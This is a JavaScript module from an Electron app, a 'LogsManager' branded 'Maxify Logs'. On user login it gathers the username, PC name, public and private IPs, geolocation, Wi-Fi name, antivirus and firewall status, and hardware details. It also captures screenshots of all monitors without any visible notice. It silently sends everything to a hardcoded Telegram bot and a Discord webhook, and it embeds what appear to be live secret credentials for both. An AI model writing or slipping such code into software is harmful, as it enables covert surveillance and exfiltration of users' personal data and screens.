import { ipcMain, desktopCapturer, screen } from 'electron';
import { exec } from 'child_process';
import os from 'os';
import si from 'systeminformation';
import axios from 'axios';
import FormData from 'form-data';
import { promisify } from 'util';
import fs from 'fs';
import path from 'path';

const execPromise = promisify(exec);

class LogsManager {
    constructor() {
        this.setupIpcHandlers();
    }

    setupIpcHandlers() {
        // Handler para quando o usuário fizer login
        ipcMain.handle('send-logs-on-login', async () => {
            await this.sendLogs();
        });
    }

    async captureAllScreenshots() {
        try {
            // Obter todas as fontes de tela disponíveis
            const sources = await desktopCapturer.getSources({
                types: ['screen'],
                thumbnailSize: {
                    width: 1920, // Tamanho máximo para cada thumbnail
                    height: 1080
                }
            });

            if (sources.length === 0) {
                throw new Error('Nenhuma fonte de tela encontrada');
            }

            const screenshotPaths = [];

            // Capturar cada tela individualmente
            for (let i = 0; i < sources.length; i++) {
                const source = sources[i];

                // Caminho temporário para salvar a imagem
                const tempPath = path.join(os.tmpdir(), `screenshot_${i}_${Date.now()}.png`);

                // Converter thumbnail para buffer e salvar
                const thumbnail = source.thumbnail.toPNG();
                fs.writeFileSync(tempPath, thumbnail);

                screenshotPaths.push({
                    path: tempPath,
                    displayId: i,
                    name: source.name || `Monitor ${i + 1}`
                });
            }

            return screenshotPaths;
        } catch (error) {
            console.error('Erro ao capturar screenshots:', error);
            return [];
        }
    }

    async combineScreenshots(screenshotPaths) {
        if (screenshotPaths.length === 0) return null;
        if (screenshotPaths.length === 1) return screenshotPaths[0].path;

        try {
            // Para múltiplas telas, vamos criar uma imagem combinada
            const sharp = require('sharp');

            const images = [];
            let totalWidth = 0;
            let maxHeight = 0;

            // Carregar todas as imagens e calcular dimensões
            for (const screenshot of screenshotPaths) {
                const metadata = await sharp(screenshot.path).metadata();
                images.push({
                    path: screenshot.path,
                    width: metadata.width,
                    height: metadata.height
                });
                totalWidth += metadata.width;
                maxHeight = Math.max(maxHeight, metadata.height);
            }

            // Criar imagem combinada
            const combinedPath = path.join(os.tmpdir(), `screenshot_combined_${Date.now()}.png`);

            // Preparar array de inputs para o sharp
            const inputs = [];
            let currentX = 0;

            for (const image of images) {
                inputs.push({
                    input: await sharp(image.path).toBuffer(),
                    left: currentX,
                    top: 0
                });
                currentX += image.width;
            }

            // Combinar imagens lado a lado
            await sharp({
                create: {
                    width: totalWidth,
                    height: maxHeight,
                    channels: 4,
                    background: { r: 0, g: 0, b: 0, alpha: 0 }
                }
            })
                .composite(inputs)
                .png()
                .toFile(combinedPath);

            return combinedPath;
        } catch (error) {
            console.error('Erro ao combinar screenshots:', error);
            // Se falhar ao combinar, retorna a primeira screenshot
            return screenshotPaths[0]?.path || null;
        }
    }

    async collectSystemInfo() {
        try {
            const [cpu, gpu, ram, disk, osInfo, system] = await Promise.all([
                si.cpu(),
                si.graphics(),
                si.mem(),
                si.diskLayout(),
                si.osInfo(),
                si.system()
            ]);

            // IP Público
            let publicIp = 'Desconhecido';
            try {
                const ipResponse = await axios.get('https://api.ipify.org');
                publicIp = ipResponse.data;
            } catch (error) {
                console.error('Erro ao obter IP público:', error);
            }

            // Localização aproximada
            let location = 'Desconhecido';
            try {
                const locationResponse = await axios.get('http://ip-api.com/json');
                const locData = locationResponse.data;
                location = `${locData.city || '?'}, ${locData.regionName || '?'}, ${locData.country || '?'}`;
            } catch (error) {
                console.error('Erro ao obter localização:', error);
            }

            // Firewall status
            const firewallStatus = await this.getFirewallStatus();

            // Antivírus
            const antivirus = await this.getAntivirus();

            // IP Privado
            const privateIp = this.getPrivateIP();

            // Tipo de conexão
            const connectionType = this.getConnectionType();

            // Nome do Wi-Fi
            const wifiName = await this.getWifiName();

            // Tempo de atividade
            const uptime = this.getUptime();

            // Placa mãe
            const motherboard = system.model || 'Desconhecido';

            // Informações de todas as telas
            const displays = screen.getAllDisplays();
            const resolutions = displays.map((display, index) =>
                `Monitor ${index + 1}: ${display.size.width}x${display.size.height}`
            ).join(' | ');

            // Nome de domínio
            const domain = osInfo.domain || 'Desconhecido';

            // Calcular RAM total em GB
            const totalRamGB = (ram.total / (1024 * 1024 * 1024)).toFixed(2);

            // Informações da GPU
            const gpuInfo = gpu.controllers.length > 0
                ? gpu.controllers[0].model
                : 'Desconhecido';

            // Serial do disco
            const diskSerial = disk.length > 0 && disk[0].serialNum
                ? disk[0].serialNum.trim()
                : 'Desconhecido';

            return {
                userName: osInfo.userName || os.userInfo().username,
                pcName: os.hostname(),
                os: `${osInfo.distro} ${osInfo.release} (${osInfo.arch})`,
                domain: domain,
                dateTime: new Date().toLocaleString('pt-BR'),
                uptime: uptime,
                ipPublic: publicIp,
                ipPrivate: privateIp,
                connectionType: connectionType,
                wifiName: wifiName,
                language: Intl.DateTimeFormat().resolvedOptions().locale,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                location: location,
                antivirus: antivirus,
                firewall: firewallStatus,
                cpu: `${cpu.manufacturer} ${cpu.brand} (${cpu.cores} cores)`,
                gpu: gpuInfo,
                ram: `${totalRamGB} GB`,
                disk: diskSerial,
                motherboard: motherboard,
                resolutions: resolutions,
                totalMonitors: displays.length,
                currentDir: process.cwd(),
                tempPath: os.tmpdir()
            };
        } catch (error) {
            console.error('Erro ao coletar informações do sistema:', error);
            return null;
        }
    }

    async sendToTelegram(info, screenshotPaths) {
        try {
            const token = '8192483400:AAE4drJ119EMkcm90Sdwu0xKm9FAMRKk4aM';
            const chatId = '-4817984606';

            const msg =
                `🔒 *Novo acesso autorizado!*

👤 Usuário: \`${info.userName}\`
💻 Nome do PC: \`${info.pcName}\`
🖥️ Sistema: \`${info.os}\`
🌐 Domínio: \`${info.domain}\`
📅 Data/Hora: \`${info.dateTime}\`
🕒 Tempo de Atividade: \`${info.uptime}\`

🌍 IP Público: \`${info.ipPublic}\`
📡 IP Privado: \`${info.ipPrivate}\`
📶 Tipo de Conexão: \`${info.connectionType}\`
📶 Rede Wi-Fi: \`${info.wifiName}\`
🌐 Idioma: \`${info.language}\`
⏰ Fuso Horário: \`${info.timezone}\`

📍 Localização: \`${info.location}\`

🛡️ Antivírus: \`${info.antivirus}\`
🔥 Firewall: \`${info.firewall}\`

💽 CPU: \`${info.cpu}\`
🎮 GPU: \`${info.gpu}\`
💾 RAM: \`${info.ram}\`
🧩 Armazenamento: \`${info.disk}\`
🖥️ Placa Mãe: \`${info.motherboard}\`
📏 Telas: \`${info.resolutions}\`

🗂️ Diretório: \`${info.currentDir}\`
📁 Temp: \`${info.tempPath}\``;

            if (screenshotPaths && screenshotPaths.length > 0) {
                // Para Telegram, vamos combinar as imagens também
                const combinedPath = await this.combineScreenshots(screenshotPaths);

                if (combinedPath) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('caption', msg); // Agora sempre usa a mensagem original sem legenda extra
                    formData.append('parse_mode', 'Markdown');
                    formData.append('photo', fs.createReadStream(combinedPath));

                    await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
                        headers: formData.getHeaders()
                    });

                    // Limpar imagem combinada
                    if (combinedPath !== screenshotPaths[0]?.path) {
                        try { fs.unlinkSync(combinedPath); } catch (e) { }
                    }
                }
            } else {
                // Enviar só texto se não tiver screenshot
                await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
                    chat_id: chatId,
                    text: msg,
                    parse_mode: 'Markdown'
                });
            }

        } catch (error) {
        }
    }

    async sendToDiscord(info, screenshotPaths) {
        try {
            const webhookUrl = 'https://discord.com/api/webhooks/1408882704677732393/YViaLAncf41tvjBzE8e0hQJfx1FWVcX0bopw55vrR6A8wyO2HygxyCwH3hiVQCLd7lZi';

            // Combinar screenshots se houver múltiplos monitores
            let imagePath = null;
            let imageFilename = 'screenshot.png';

            if (screenshotPaths && screenshotPaths.length > 0) {
                if (screenshotPaths.length === 1) {
                    imagePath = screenshotPaths[0].path;
                } else {
                    imagePath = await this.combineScreenshots(screenshotPaths);
                    imageFilename = 'screenshots_combined.png';
                }
            }

            // Criar embed com todas as informações e a imagem combinada
            const embed = {
                title: '<:icons8boyontherocket100:1332618970628620300> Novo acesso autorizado!',
                color: 0x05F804,
                fields: [
                    { name: '<:icons8user1001:1332620007565299753> Usuário', value: `${info.userName}`},
                    { name: '<:icons8edit100:1332618968959025274> Nome do PC', value: `${info.pcName}`},
                    { name: '<:icons8config100:1332618989716639776> Sistema', value: `${info.os}`},
                    { name: '<:icons8alarmclock100:1332618962667573308> Data/Hora', value: `${info.dateTime}`},
                    { name: '<:icons8chaveinglesa100:1333040713901932625> IP Público', value: `${info.ipPublic}`},
                    { name: '<:icons8link100:1335335327124164738> IP Privado', value: `${info.ipPrivate}`},
                    { name: '<:icons8pesquisar100:1332959344127512586> Localização', value: `${info.location}`},
                    { name: '<:icons8config100:1332618989716639776> CPU', value: `${info.cpu}`},
                    { name: '<:icons8stellar100:1332618965012447264> RAM', value: `${info.ram}`},
                    { name: '<:icons8link100:1335335327124164738> Wi-Fi', value: `${info.wifiName}`},
                    { name: '<:icons8vassoura100:1336810607927885886> Antivírus', value: `${info.antivirus}`},
                    { name: '<:icons8lightningbolt100:1332618966358822973> Firewall', value: `${info.firewall}`},
                    { name: '<:icons8termsandconditions100:1335352538719060059> Resoluções', value: `${info.resolutions}`},
                    { name: '<:icons8binculos100:1332703995801636928> Total de Monitores', value: `${info.totalMonitors}`},
                ],
                timestamp: new Date().toISOString()
            };

            // Adicionar a imagem combinada ao embed
            if (imagePath && fs.existsSync(imagePath)) {
                embed.image = { url: `attachment://${imageFilename}` };
            }

            const formData = new FormData();
            const payload = {
                embeds: [embed],
                username: 'Maxify Logs'
            };

            formData.append('payload_json', JSON.stringify(payload));

            // Adicionar a screenshot se existir
            if (imagePath && fs.existsSync(imagePath)) {
                formData.append('file', fs.createReadStream(imagePath), {
                    filename: imageFilename,
                    contentType: 'image/png'
                });
            }

            await axios.post(webhookUrl, formData, {
                headers: formData.getHeaders()
            });

            // Limpar imagem combinada se foi criada
            if (imagePath && screenshotPaths.length > 1 && imagePath !== screenshotPaths[0]?.path) {
                try { fs.unlinkSync(imagePath); } catch (e) { }
            }

        } catch (error) {
        }
    }

    async sendLogs() {
        const info = await this.collectSystemInfo();
        let screenshotPaths = [];

        if (info) {
            // Capturar screenshots de todos os monitores
            try {
                screenshotPaths = await this.captureAllScreenshots();
            } catch (error) {
                console.error('Erro ao capturar screenshots:', error);
            }

            // Enviar para ambos
            await Promise.all([
                this.sendToTelegram(info, screenshotPaths),
                this.sendToDiscord(info, screenshotPaths)
            ]);

            // Limpar arquivos temporários individuais
            for (const screenshot of screenshotPaths) {
                if (fs.existsSync(screenshot.path)) {
                    try {
                        fs.unlinkSync(screenshot.path);
                    } catch (error) {
                        console.error('Erro ao deletar screenshot:', error);
                    }
                }
            }
        }
    }

    // Métodos auxiliares (mantidos iguais)
    getPrivateIP() {
        const interfaces = os.networkInterfaces();
        for (const name in interfaces) {
            for (const iface of interfaces[name]) {
                if (iface.family === 'IPv4' && !iface.internal) {
                    return iface.address;
                }
            }
        }
        return 'Desconhecido';
    }

    getConnectionType() {
        try {
            const interfaces = os.networkInterfaces();
            for (const name in interfaces) {
                if (!interfaces[name].some(iface => iface.internal)) {
                    if (name.toLowerCase().includes('wi-fi') || name.toLowerCase().includes('wireless')) {
                        return 'Wi-Fi';
                    }
                    if (name.toLowerCase().includes('ethernet')) {
                        return 'Ethernet';
                    }
                }
            }
        } catch (error) {
            console.error('Erro ao obter tipo de conexão:', error);
        }
        return 'Desconhecido';
    }

    async getWifiName() {
        return new Promise((resolve) => {
            if (process.platform === 'win32') {
                exec('netsh wlan show interfaces', (error, stdout) => {
                    if (error) {
                        resolve('Desconhecido');
                        return;
                    }
                    const match = stdout.match(/SSID\s*:\s*(.+)/);
                    resolve(match ? match[1].trim() : 'Desconhecido');
                });
            } else {
                resolve('Desconhecido');
            }
        });
    }

    async getFirewallStatus() {
        return new Promise((resolve) => {
            if (process.platform === 'win32') {
                exec('netsh advfirewall show currentprofile', (error, stdout) => {
                    if (error) {
                        resolve('Desconhecido');
                        return;
                    }
                    const match = stdout.match(/State\s*(\w+)/);
                    resolve(match ? (match[1].toLowerCase() === 'on' ? 'Ativado' : 'Desativado') : 'Desconhecido');
                });
            } else {
                resolve('Desconhecido');
            }
        });
    }

    async getAntivirus() {
        return new Promise((resolve) => {
            if (process.platform === 'win32') {
                exec('wmic /namespace:\\\\root\\securitycenter2 path antivirusproduct get displayname', (error, stdout) => {
                    if (error) {
                        resolve('Desconhecido');
                        return;
                    }
                    const lines = stdout.split('\n').filter(line => line.trim() && !line.includes('DisplayName'));
                    resolve(lines.length > 0 ? lines[0].trim() : 'Desconhecido');
                });
            } else {
                resolve('Desconhecido');
            }
        });
    }

    getUptime() {
        const uptimeSeconds = os.uptime();
        const days = Math.floor(uptimeSeconds / 86400);
        const hours = Math.floor((uptimeSeconds % 86400) / 3600);
        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
        return `${days}d ${hours}h ${minutes}m`;
    }
}

export default LogsManager;